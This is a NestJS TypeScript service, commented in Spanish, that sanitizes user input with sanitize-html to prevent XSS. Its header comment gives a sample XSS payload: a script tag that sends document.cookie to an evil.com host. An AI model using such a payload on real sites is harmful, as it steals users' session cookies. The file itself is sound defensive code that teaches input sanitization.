import { Injectable } from '@nestjs/common';
import * as sanitizeHtml from 'sanitize-html';

// ============================================================
// 🛡️ SANITIZATION SERVICE - PREVENCIÓN DE XSS
// ============================================================
// Cross-Site Scripting (XSS) es cuando un atacante inyecta
// código JavaScript malicioso en tu aplicación.
//
// EJEMPLO DE ATAQUE:
// Un atacante pone como nombre de producto:
// "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"
//
// Si no sanitizas y muestras esto en el frontend, el navegador
// ejecutará ese script y robará las cookies del usuario.
//
// SOLUCIÓN: Sanitizar TODO texto que:
// 1. Viene del usuario
// 2. Se mostrará en HTML (nombres, descripciones, comentarios)
// ============================================================

@Injectable()
export class SanitizationService {
    // ============================================================
    // TEXTO PLANO - Sin HTML permitido
    // ============================================================
    // Usar para: nombres, emails, SKUs, códigos, slugs
    // Convierte TODO a texto plano, eliminando cualquier tag HTML
    // ============================================================
    sanitizePlainText(input: string): string {
        if (!input) return input;

        return sanitizeHtml(input, {
            allowedTags: [],         // No permite NINGÚN tag HTML
            allowedAttributes: {},    // No permite atributos
            textFilter: (text) => text.trim(), // Limpia espacios extra
        });
    }

    // ============================================================
    // TEXTO RICO BÁSICO - HTML limitado
    // ============================================================
    // Usar para: descripciones de productos, contenido de blog
    // Permite: bold, italic, listas, párrafos, links
    // Bloquea: scripts, iframes, event handlers
    // ============================================================
    sanitizeRichText(input: string): string {
        if (!input) return input;

        return sanitizeHtml(input, {
            allowedTags: [
                // Texto básico
                'p', 'br', 'span',
                // Formato
                'b', 'strong', 'i', 'em', 'u', 's', 'strike',
                // Listas
                'ul', 'ol', 'li',
                // Links (con restricciones)
                'a',
                // Encabezados
                'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
                // Otros
                'blockquote', 'code', 'pre',
            ],
            allowedAttributes: {
                // Solo permitir href en links, y solo http/https
                'a': ['href', 'title', 'target'],
                // Permitir clases para styling
                'span': ['class'],
                'p': ['class'],
            },
            // Solo permitir links HTTP/HTTPS (no javascript:)
            allowedSchemes: ['http', 'https'],
            // Forzar target="_blank" en links para seguridad
            transformTags: {
                'a': sanitizeHtml.simpleTransform('a', {
                    target: '_blank',
                    rel: 'noopener noreferrer', // Previene tab-nabbing
                }),
            },
        });
    }

    // ============================================================
    // NÚMEROS - Validación estricta
    // ============================================================
    // Aunque TypeScript valida tipos, en runtime todo puede llegar
    // como string. Esta función asegura que es un número válido.
    // ============================================================
    sanitizeNumber(input: unknown, defaultValue: number = 0): number {
        if (typeof input === 'number' && !isNaN(input) && isFinite(input)) {
            return input;
        }

        if (typeof input === 'string') {
            const parsed = parseFloat(input);
            if (!isNaN(parsed) && isFinite(parsed)) {
                return parsed;
            }
        }

        return defaultValue;
    }

    // ============================================================
    // SLUG - Solo caracteres seguros para URLs
    // ============================================================
    // Convierte "Mi Producto $100!" → "mi-producto-100"
    // Solo permite: letras, números, guiones
    // ============================================================
    sanitizeSlug(input: string): string {
        if (!input) return input;

        return input
            .toLowerCase()
            .normalize('NFD')                          // Separa acentos de letras
            .replace(/[\u0300-\u036f]/g, '')           // Elimina acentos
            .replace(/[^a-z0-9\s-]/g, '')              // Solo letras, números, espacios, guiones
            .replace(/\s+/g, '-')                      // Espacios → guiones
            .replace(/-+/g, '-')                       // Múltiples guiones → uno solo
            .replace(/^-|-$/g, '');                    // Elimina guiones al inicio/final
    }

    // ============================================================
    // EMAIL - Validación y normalización
    // ============================================================
    sanitizeEmail(input: string): string {
        if (!input) return input;

        return input
            .toLowerCase()
            .trim()
            .replace(/\s/g, ''); // Elimina espacios (usuarios a veces copian mal)
    }

    // ============================================================
    // SANITIZAR OBJETO COMPLETO
    // ============================================================
    // Útil para sanitizar DTOs enteros de una vez
    // ============================================================
    sanitizeObject<T extends Record<string, unknown>>(
        obj: T,
        rules: {
            plainText?: (keyof T)[];
            richText?: (keyof T)[];
            slug?: (keyof T)[];
            email?: (keyof T)[];
        },
    ): T {
        const result = { ...obj };

        rules.plainText?.forEach((key) => {
            if (typeof result[key] === 'string') {
                (result as Record<string, unknown>)[key as string] = this.sanitizePlainText(result[key] as string);
            }
        });

        rules.richText?.forEach((key) => {
            if (typeof result[key] === 'string') {
                (result as Record<string, unknown>)[key as string] = this.sanitizeRichText(result[key] as string);
            }
        });

        rules.slug?.forEach((key) => {
            if (typeof result[key] === 'string') {
                (result as Record<string, unknown>)[key as string] = this.sanitizeSlug(result[key] as string);
            }
        });

        rules.email?.forEach((key) => {
            if (typeof result[key] === 'string') {
                (result as Record<string, unknown>)[key as string] = this.sanitizeEmail(result[key] as string);
            }
        });

        return result;
    }
}
